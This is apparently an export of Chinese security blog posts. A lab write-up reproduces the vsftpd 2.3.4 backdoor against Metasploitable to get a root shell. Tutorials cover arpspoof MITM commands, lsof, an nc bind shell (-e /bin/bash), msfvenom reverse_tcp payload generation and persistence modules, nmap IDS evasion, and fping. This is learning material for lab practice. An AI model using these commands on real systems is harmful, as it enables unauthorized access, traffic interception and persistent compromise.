[{"content":"实验笔记：vsftpd 2.3.4 笑脸漏洞复现\n实验目标 复现 vsftpd 2.3.4 的“笑脸漏洞”，通过该漏洞获取靶机的 root 权限。\n实验环境 攻击机：Kali Linux 靶机：Metasploitable Linux 2.0.0 实验步骤 一、环境搭建 下载并启动靶机\n下载 Metasploitable Linux 2.0.0 镜像文件。 解压后使用 VMware 打开并启动虚拟机。 登录靶机并修改 root 密码\n使用普通用户 msfadmin 登录，密码为 msfadmin。\n修改 root 用户的密码：\n1 msfadmin@metasploitable:~$ sudo passwd root 按提示输入新密码。\n二、漏洞复现 端口扫描\n在 Kali Linux 上打开终端，使用 nmap 扫描靶机的开放端口：\n1 nmap 192.168.xx.xx （将 192.168.xx.xx 替换为靶机的实际 IP 地址）\n确认靶机开放了 21 (FTP) 端口。\n扫描 FTP 服务版本\n使用 nmap 扫描 FTP 服务的版本信息：\n1 nmap -sV 192.168.xx.xx 确认靶机运行的是 vsftpd 2.3.4 版本。\n触发漏洞\n在 Kali Linux 上使用 Netcat (nc) 连接靶机的 21 端口：\n1 nc 192.168.xx.xx 21 输入以下命令（注意手动输入）：\n1 2 user mz:) pass aaaaa 此时靶机的 6200 端口会自动开启。保持当前终端状态，不要关闭。\n验证 6200 端口\n在 Kali Linux 上另起一个终端，使用 nmap 扫描 6200 端口：\n1 sudo nmap -sS -p 6200 192.168.xx.xx 确认 6200 端口已开启。\n获取 root 权限\n使用 Netcat 连接靶机的 6200 端口：\n1 nc 192.168.xx.xx 6200 成功连接后，即可以 root 身份登录靶机。\n注意：连接后执行ls查看是都已经进去半终端\n确认进入半终端可执行python -c \u0026lsquo;import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)\u0026rsquo; 调用完整终端\n三、实验注意事项 如果在实验过程中遇到问题，可以尝试重启靶机。 确保在触发漏洞后保持 Netcat 连接状态，否则 6200 端口可能会关闭。 实验总结： 本次实验通过 vsftpd 2.3.4 的“笑脸漏洞”，成功获取了靶机的 root 权限。实验过程中，关键在于正确触发漏洞并保持 Netcat 连接状态，以确保后续操作的顺利进行。\n","date":"2025-04-21T12:59:27+08:00","permalink":"https://souljian.cn/p/745211567/","title":"FTP笑脸漏洞复现"},{"content":"一、简介 arpspoof 是一款用于 ARP 欺骗的工具，能够发送伪造的 ARP 数据包，欺骗网络中的设备，使其将攻击者的设备误认为是目标设备。这通常用于中间人攻击（MITM），例如捕获网络流量或篡改数据。\n二、安装 （一）Kali Linux arpspoof 在 Kali Linux 中通常已经预装。如果没有安装，可以通过安装 dsniff 包来获取：\n1 2 sudo apt-get update sudo apt-get install dsniff （二）Ubuntu 在 Ubuntu 上，arpspoof 也包含在 dsniff 包中：\n1 2 sudo apt-get update sudo apt-get install dsniff （三）CentOS 在 CentOS 上，可以通过安装 dsniff 包来获取 arpspoof：\n1 2 sudo yum install epel-release sudo yum install dsniff 安装完成后，可以通过以下命令验证 arpspoof 是否安装成功：\n1 arpspoof --help 三、基本语法 1 arpspoof [选项] [目标 IP] 四、常用选项 选项 说明 -i \u0026lt;接口\u0026gt; 指定要使用的网络接口。 -t \u0026lt;目标 IP\u0026gt; 指定一个特殊的、将被 ARP 毒化的主机。 -r 毒化两个主机（目标和主机）以捕获两个方向的网络流量。 `-c own host 五、使用示例 （一）欺骗单个目标 1 sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 将目标主机（192.168.1.100）的 ARP 表项中的默认网关（192.168.1.1）指向攻击者的设备。\n（二）自动欺骗网关 1 sudo arpspoof -i eth0 -r 192.168.1.100 自动将目标主机（192.168.1.100）的 ARP 表项中的默认网关指向攻击者的设备。\n（三）欺骗整个网络 1 sudo arpspoof -i eth0 -t 192.168.1.0/24 192.168.1.1 将整个网络中的设备的 ARP 表项中的默认网关指向攻击者的设备。\n（四）恢复 ARP 表项 1 sudo arpspoof -i eth0 -c both -t 192.168.1.100 192.168.1.1 恢复目标主机（192.168.1.100）的 ARP 表项，使其恢复正常。\n六、注意事项 权限问题：arpspoof 需要管理员权限才能运行。 网络环境：某些网络环境可能检测到 ARP 欺骗行为并采取措施。 法律问题：未经授权的 ARP 欺骗行为可能违反法律法规。 网络拓扑：在复杂的网络环境中，可能需要调整攻击策略以确保有效欺骗。 工具替代：如果 arpspoof 不可用，可以使用其他工具（如 ettercap 或 bettercap）来实现类似功能。 七、总结 arpspoof 是一个功能强大的 ARP 欺骗工具，常用于中间人攻击（MITM）。通过掌握基本语法和高级用法，可以快速实现网络流量的捕获和篡改，帮助进行网络安全测试和分析。\n","date":"2025-04-21T10:40:37+08:00","permalink":"https://souljian.cn/p/745203237/","title":"Arpspoof命令使用"},{"content":" 一、lsof 简介 lsof（List Open Files）是一个功能强大的命令行工具，用于列出当前系统中所有打开的文件及其相关进程。在 Unix 和 Linux 系统中，几乎所有事物（包括常规文件、目录、网络连接、设备等）都被视为文件，因此 lsof 在多种场景下都非常有用。\n二、安装 lsof 在大多数 Linux 发行版中，lsof 可通过包管理器安装：\nDebian/Ubuntu：\n1 2 sudo apt update sudo apt install lsof CentOS/RHEL：\n1 sudo yum install lsof Arch Linux：\n1 sudo pacman -S lsof 三、基本语法 1 lsof [选项] [文件名或目录] 四、常用选项 （一）按进程过滤 -p \u0026lt;PID\u0026gt;：按进程 ID 过滤。\n1 lsof -p 1234 -c \u0026lt;进程名\u0026gt;：按进程名过滤。\n1 lsof -c sshd -c \u0026lt;进程名1\u0026gt; -c \u0026lt;进程名2\u0026gt;：同时列出多个进程的打开文件。\n1 lsof -c mysql -c apache （二）按用户过滤 -u \u0026lt;用户名\u0026gt;：按用户名过滤。\n1 lsof -u username -u ^\u0026lt;用户名\u0026gt;：排除指定用户的打开文件。\n1 lsof -u ^root （三）按文件名或目录过滤 指定文件名或目录名，列出与之相关的打开文件。\n1 2 lsof /path/to/file lsof /path/to/directory 使用 +D 递归列出目录及其子目录下所有打开的文件。\n1 lsof +D /path/to/directory （四）按网络连接过滤 -i：显示所有网络连接。\n1 lsof -i -i :\u0026lt;端口号\u0026gt;：按端口号过滤。\n1 lsof -i :80 -i \u0026lt;协议\u0026gt;@\u0026lt;IP地址\u0026gt;：按协议和 IP 地址过滤。\n1 lsof -i tcp@192.168.1.100 -i TCP：仅显示 TCP 连接。\n1 lsof -i TCP -i UDP：仅显示 UDP 连接。\n1 lsof -i UDP （五）其他选项 -n：不解析主机名，直接显示 IP 地址。\n-P：不解析端口号，直接显示数字。\n-t：仅显示进程 ID。\n-l：显示文件的 inode 号。\n-a：组合多个条件。\n1 lsof -u username -c process_name 五、使用场景 （一）查找占用特定文件的进程 1 lsof /var/log/syslog 此命令可帮助你找出哪个进程正在使用 /var/log/syslog 文件。\n（二）查找占用特定端口的进程 1 lsof -i :80 此命令可帮助你找出哪个进程正在使用 TCP 端口 80。\n（三）查找某个用户打开的文件 1 lsof -u username 此命令可列出用户 username 打开的所有文件。\n（四）查看某个进程打开的文件 1 lsof -p 1234 此命令可列出进程 ID 为 1234 的所有打开文件。\n（五）查找被删除但仍在使用的文件 1 lsof | grep deleted 此命令可帮助你找出已被删除但仍被进程占用的文件。\n（六）监控文件系统活动 1 lsof +D /path/to/directory 此命令可实时监控指定目录及其子目录下所有打开的文件。\n（七）查找打开的文件数量 1 lsof | wc -l 此命令可统计系统中打开的文件总数。\n（八）识别资源泄漏 1 lsof -p \u0026lt;PID\u0026gt; 此命令可帮助你查找某个进程打开的文件，从而排查资源泄漏问题。\n（九）查看特定类型的文件 1 lsof -U 此命令可列出所有 Unix 域套接字。\n六、高级用法 （一）列出监听的网络连接 1 lsof -i TCP:LISTEN 此命令可列出所有处于监听状态的 TCP 端口。\n（二）列出特定用户的网络连接 1 lsof -a -u username -i 此命令可列出用户 username 的所有网络连接。\n（三）列出特定协议的文件 1 lsof -i TCP:https 此命令可列出所有使用 HTTPS 端口的 TCP 文件。\n（四）重复模式 1 lsof -r 5 -i UDP 此命令每 5 秒输出一次所有正在进行的 UDP 连接，直到手动终止。\n（五）列出特定范围的文件描述符 1 lsof -d 2-3 此命令可列出文件描述符范围为 2-3 的文件。\n七、注意事项 权限问题：某些信息（如其他用户的文件）可能需要管理员权限才能查看。 输出格式：lsof 的输出包含多个字段，如进程 ID、用户、文件描述符等。可以通过 man lsof 查看详细字段说明。 性能影响：在系统文件数量较多时，lsof 的运行可能会稍显缓慢，尤其是在没有过滤条件的情况下。 八、总结 lsof 是一个功能强大的工具，适用于多种场景，包括故障排查、性能监测、资源管理等。通过掌握基本语法和常用选项，可以快速定位文件占用、网络连接等问题。结合过滤条件和其他命令，lsof 的应用场景更加广泛，能够满足复杂的系统管理和调试需求。\n","date":"2025-04-21T10:39:12+08:00","permalink":"https://souljian.cn/p/745203152/","title":"Lsof命令使用"},{"content":"一、简介 nc（Netcat）是一个功能强大的网络工具，用于读写网络连接（TCP 和 UDP）。它常被称为“网络瑞士军刀”，可用于端口扫描、数据传输、远程控制等多种用途。\n二、安装 （一）通过包管理器安装 Debian/Ubuntu：\n1 2 sudo apt update sudo apt install netcat CentOS/RHEL：\n1 sudo yum install nc Arch Linux：\n1 sudo pacman -S inetutils Fedora：\n1 sudo dnf install nc openSUSE：\n1 sudo zypper install netcat-openbsd （二）从源代码编译安装 从官方网站下载 nc 的源代码。\n解压源代码包并进入解压后的目录。\n执行以下命令来编译和安装 nc：\n1 2 3 ./configure make sudo make install （三）验证安装 安装完成后，可以通过运行以下命令来验证 nc 是否安装成功：\n1 nc -h 如果返回 nc 命令的帮助信息，则表示安装成功。\n三、基本语法 1 nc [选项] [主机] [端口] 四、常用选项 选项 说明 -l 使用监听模式，管控传入的资料 -p 设置本地主机使用的通信端口 -s 设置本地主机送出数据包的 IP 地址 -u 使用 UDP 传输协议 -v 显示指令执行过程 -w 设置等待连线的时间 -z 使用 0 输入/输出模式，只在扫描通信端口时使用 五、使用示例 （一）端口扫描 TCP 端口扫描：\n1 nc -zv 192.168.1.1 80-443 扫描目标 IP 地址（192.168.1.1）上的端口 80 到 443，检查是否开放。\nUDP 端口扫描：\n1 nc -zvu 192.168.1.1 53 扫描目标主机的 UDP 端口 53。\n（二）监听端口 TCP 端口监听：\n1 nc -l 8080 在本地监听 8080 端口。\nUDP 端口监听：\n1 nc -u -l 8080 使用 UDP 协议监听 8080 端口。\n（三）数据传输 发送文件：\n1 nc 192.168.1.2 12345 \u0026lt; file.txt 将 file.txt 发送到远程主机的 12345 端口。\n接收文件：\n1 nc -l 12345 \u0026gt; file.txt 在本地监听 12345 端口并接收文件。\n（四）远程命令执行 目标机器上：\n1 nc -lvp 4444 -e /bin/bash 在目标机器上监听 4444 端口，并将 /bin/bash 作为远程命令执行。\n攻击者机器上：\n1 nc 192.168.1.2 4444 连接到目标机器的 4444 端口，获取远程命令执行的 Shell。\n（五）端口转发 本地端口转发：\n1 nc -l 8080 | nc 192.168.1.100 80 将本地 8080 端口的数据转发到远程服务器的 80 端口。\n（六）网络调试 发送 HTTP 请求：\n1 echo -ne \u0026#34;GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\u0026#34; | nc example.com 80 向目标服务器发送 HTTP 请求。\n六、注意事项 权限问题：某些功能（如监听低端口号）可能需要管理员权限。 安全问题：使用远程命令执行功能时需谨慎，避免安全风险。 版本差异：不同版本的 nc（如 netcat、ncat）功能可能有所不同。 安装路径：安装完成后，可能需要将 nc 的路径添加到系统的环境变量中，以便在任意终端中直接使用。 七、总结 nc 是一个功能强大的网络工具，适用于多种场景，包括端口扫描、数据传输、远程控制等。通过掌握基本语法和高级功能，可以快速实现网络通信和数据传输，帮助进行网络管理和故障排查。\n","date":"2025-04-21T10:37:16+08:00","permalink":"https://souljian.cn/p/745203036/","title":"Nc（netcat）命令使用"},{"content":"一、简介 msfconsole 是 Metasploit Framework 的命令行界面，用于执行各种安全测试和渗透测试任务。Metasploit 是一个功能强大的渗透测试工具，提供了丰富的漏洞利用模块、后渗透工具和自动化功能。\n二、安装 Kali Linux（Metasploit 已预装）：\n1 2 sudo apt update sudo apt install metasploit-framework 其他 Linux 发行版： 可以通过 Rapid7 官方网站 获取安装指南。\n三、基本语法 1 msfconsole 四、常用命令 （一）启动 msfconsole 1 msfconsole （二）查找模块 1 search \u0026lt;keyword\u0026gt; 例如：\n1 search apache （三）使用模块 1 use \u0026lt;module\u0026gt; 例如：\n1 use exploit/unix/webapp/apache_mod_cgi （四）设置模块选项 1 set \u0026lt;option\u0026gt; \u0026lt;value\u0026gt; 例如：\n1 2 set RHOSTS 192.168.1.100 set RPORT 80 （五）查看模块选项 1 show options （六）运行模块 1 run （七）退出 msfconsole 1 exit 五、高级用法 （一）自动化攻击 使用 msfconsole 的自动化功能可以快速执行攻击任务。例如：\n1 msfconsole -q -x \u0026#34;use exploit/unix/webapp/apache_mod_cgi; set RHOSTS 192.168.1.100; set RPORT 80; run\u0026#34; （二）生成 Meterpreter 有效载荷 1 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe （三）使用 Meterpreter 会话 1 2 sessions -l sessions -i \u0026lt;session_id\u0026gt; （四）后渗透攻击 1 2 search post use post/windows/manage/persistence （五）利用漏洞 1 2 3 4 5 search exploit use exploit/unix/webapp/apache_mod_cgi set RHOSTS 192.168.1.100 set RPORT 80 run （六）端口扫描 查看端口扫描模块：\n1 search portscan 使用端口扫描模块：\n1 use auxiliary/scanner/portscan/top 查看模块选项：\n1 show options 设置目标 IP：\n1 set RHOSTS 192.168.1.100 设置线程数：\n1 set THREADS 100 执行扫描：\n1 run （七）服务扫描 查看服务扫描模块：\n1 search smb_version 使用服务扫描模块：\n1 use auxiliary/scanner/smb/smb_version 查看模块选项：\n1 show options 设置目标 IP：\n1 set RHOSTS 192.168.1.100 设置线程数：\n1 set THREADS 10 执行扫描：\n1 run 六、注意事项 权限问题：某些功能（如监听低端口号）可能需要管理员权限。 网络环境：某些网络环境可能限制某些模块的使用。 法律问题：未经授权的渗透测试行为可能违反法律法规。 七、总结 msfconsole 是一个功能强大的渗透测试工具，适用于多种安全测试场景，包括漏洞利用、后渗透攻击和自动化攻击。通过掌握基本语法和高级用法，可以快速定位网络中的漏洞并进行安全审计。\n","date":"2025-04-20T23:10:14+08:00","permalink":"https://souljian.cn/p/745161814/","title":"Msfconsole命令使用"},{"content":"一、简介 nmap 是一款开源的网络探测和安全审核工具，可以用来扫描网络主机，确定哪些主机在运行、运行哪些服务以及运行哪个操作系统等信息。它支持多种扫描技术，能够识别网络上的活跃设备、开放端口、运行服务和操作系统类型。\n二、安装 Debian/Ubuntu：\n1 2 sudo apt update sudo apt install nmap CentOS/RHEL：\n1 sudo yum install nmap Arch Linux：\n1 sudo pacman -S nmap 三、基本语法 1 nmap [选项] [目标] 四、常用选项 （一）扫描类型 -sS：TCP SYN 扫描（半开放扫描）。 -sT：TCP 连接扫描。 -sU：UDP 扫描。 -sP：仅进行主机发现。 -sV：服务版本检测。 -O：操作系统检测。 （二）端口指定 -p \u0026lt;端口\u0026gt;：指定扫描的端口范围。\n1 nmap -p 80,443 target_ip -p-：扫描所有 65535 个端口。\n1 nmap -p- target_ip （三）输出选项 -oN \u0026lt;文件\u0026gt;：将扫描结果保存到普通文本文件。\n1 nmap -oN scan_results.txt target_ip -oX \u0026lt;文件\u0026gt;：将扫描结果保存为 XML 格式。\n1 nmap -oX scan_results.xml target_ip -oG \u0026lt;文件\u0026gt;：将扫描结果保存为 Grepable 格式。\n1 nmap -oG scan_results.gnmap target_ip （四）其他选项 -v：详细模式，显示更多信息。\n1 nmap -v target_ip -A：启用操作系统和服务版本检测。\n1 nmap -A target_ip -T \u0026lt;级别\u0026gt;：设置扫描速度（0 最慢，5 最快）。\n1 nmap -T4 target_ip -Pn：跳过主机发现，直接扫描指定主机。\n1 nmap -Pn target_ip 五、高级功能与选项 （一）服务版本检测 使用 -sV 选项可以检测目标主机开放端口上运行的服务及其版本信息。这对于漏洞扫描和服务识别非常有用：\n1 nmap -sV target_ip （二）操作系统检测 nmap 可以通过分析网络堆栈，尝试识别目标主机的操作系统类型和版本：\n1 nmap -O target_ip （三）脚本扫描 nmap 的脚本引擎（NSE）支持数百个脚本，涵盖从服务检测到漏洞扫描、恶意软件检测、Brute-force 攻击等多种用途。例如，使用漏洞扫描脚本集：\n1 nmap --script vuln target_ip （四）扫描速度控制 在高流量或防火墙严格的网络环境中，可以通过 -T 选项调整扫描速度（0为最慢，5为最快）。例如，快速扫描：\n1 nmap -T4 target_ip （五）防火墙规避 nmap 提供了一些技术来规避防火墙和入侵检测系统（IDS），例如使用碎片化数据包（-f）、修改扫描速率（-T0 至 -T5）。\n（六）并发扫描与负载优化 nmap 支持并发扫描和负载优化，以提高扫描效率。例如，禁用主机发现（-Pn）和 DNS 解析（-n）：\n1 nmap -Pn -n target_ip （七）自定义数据包发送 高级用户可以利用 nmap 构建和发送自定义数据包，例如通过 --data-length、--data-string 等参数。\n（八）网络拓扑发现与可视化 nmap 可以结合 traceroute 绘制网络拓扑图，展示网络设备之间的连接关系。\n（九）漏洞扫描与安全审计 借助 NSE 脚本，nmap 可以进行各种漏洞扫描，包括已知漏洞的检测和配置错误的识别。\n（十）结果输出与报告生成 nmap 支持多种结果输出格式，如标准输出、XML 格式（-oX）、Grepable 格式（-oG）。\n六、使用示例 （一）基本扫描 扫描单个主机：\n1 nmap 192.168.1.100 扫描多个主机：\n1 nmap 192.168.1.1-10 扫描特定端口：\n1 nmap -p 80,443 192.168.1.100 （二）高级扫描 服务版本检测：\n1 nmap -sV 192.168.1.100 操作系统检测：\n1 nmap -O 192.168.1.100 快速扫描：\n1 nmap -F 192.168.1.100 扫描网络中的所有主机：\n1 nmap -sP 192.168.1.0/24 （三）脚本扫描 使用 NSE 脚本进行漏洞扫描：\n1 nmap --script vuln 192.168.1.100 使用特定脚本：\n1 nmap --script http-title 192.168.1.100 （四）防火墙规避 使用碎片化数据包：\n1 nmap -f 192.168.1.100 调整扫描速度：\n1 nmap -T0 192.168.1.100 （五）并发扫描与负载优化 禁用主机发现和 DNS 解析：\n1 nmap -Pn -n 192.168.1.100 七、注意事项 权限问题：某些扫描类型（如 -sS）需要管理员权限才能运行。 网络环境：某些网络环境可能限制 ICMP 请求或特定端口的扫描。 扫描速度：在高流量或防火墙严格的网络环境中，需要调整扫描速度以避免被检测到。 结果输出：使用 -oN、-oX、-oG 等选项保存扫描结果，便于后续分析。 八、总结 nmap 是一个功能强大的网络扫描工具，适用于多种场景，包括网络发现、端口扫描、服务检测、操作系统识别和漏洞扫描。通过掌握基本语法和高级功能，可以快速定位网络中的设备和服务，帮助进行网络管理和安全审计。\n","date":"2025-04-20T22:59:14+08:00","permalink":"https://souljian.cn/p/745161154/","title":"Nmap命令使用"},{"content":" 一、简介 fping 是一个用于发送 ICMP Echo 请求的工具，类似于 ping，但它可以同时对多个主机进行 ICMP Echo 请求，并且输出结果更加简洁。它特别适合用于批量检测主机的存活性。\n二、安装 Debian/Ubuntu：\n1 2 sudo apt update sudo apt install fping CentOS/RHEL：\n1 sudo yum install fping Arch Linux：\n1 sudo pacman -S fping 三、基本语法 1 fping [选项] [主机列表] 四、常用选项 -a：仅显示存活的主机。 -b：设置 ping 数据包的大小（默认为 56 字节）。 -c：设置每个目标的 ping 次数（默认为 1）。 -f：从文件获取目标列表（不能与 -g 同时使用）。 -g：通过指定起始和结束地址来生成目标列表，可以是网段。 -l：循环发送 ping。 -u：显示不可到达的目标。 -s：显示统计信息，包括发送和接收的 ICMP Echo 请求数量。 五、使用示例 （一）基本用法 ping 单个主机：\n1 fping 192.168.1.100 发送 ICMP Echo 请求到 192.168.1.100。\nping 多个主机：\n1 fping 192.168.1.1 192.168.1.2 192.168.1.3 同时对多个主机发送 ICMP Echo 请求。\nping 网段中的所有主机：\n1 fping -g 192.168.1.0/24 生成并扫描 192.168.1.0/24 网段中的所有主机。\n仅显示存活的主机：\n1 fping -a 192.168.1.1 192.168.1.2 192.168.1.3 仅显示响应 ICMP Echo 请求的主机。\n（二）高级用法 显示统计信息：\n1 fping -s 192.168.1.1 192.168.1.2 192.168.1.3 发送 ICMP Echo 请求并显示统计信息，包括发送和接收的 ICMP Echo 请求数量。\n指定发送次数和间隔：\n1 fping -c 3 -i 100 192.168.1.100 对 192.168.1.100 发送 3 次 ICMP Echo 请求，每次请求间隔 100 毫秒。\n从文件中读取主机列表：\n1 fping -f hosts.txt 从文件 hosts.txt 中读取主机列表并进行 ICMP Echo 请求。\n显示存活的主机并统计：\n1 fping -a -s 192.168.1.0/24 扫描 192.168.1.0/24 网段中的所有主机，仅显示存活的主机并显示统计信息。\n六、注意事项 权限问题：fping 需要管理员权限才能发送 ICMP 请求。 网络环境：某些网络环境可能限制 ICMP 请求，导致 fping 无法正常工作。 输出格式：fping 的输出格式较为简洁，适合批量检测主机存活性。 七、总结 fping 是一个功能强大的工具，特别适合用于批量检测主机的存活性。通过掌握基本语法和常用选项，可以快速定位网络中的存活主机。结合 -s 参数，可以获取更详细的统计信息，帮助分析网络状态。\n","date":"2025-04-20T20:49:53+08:00","permalink":"https://souljian.cn/p/745153393/","title":"Fping命令使用"}]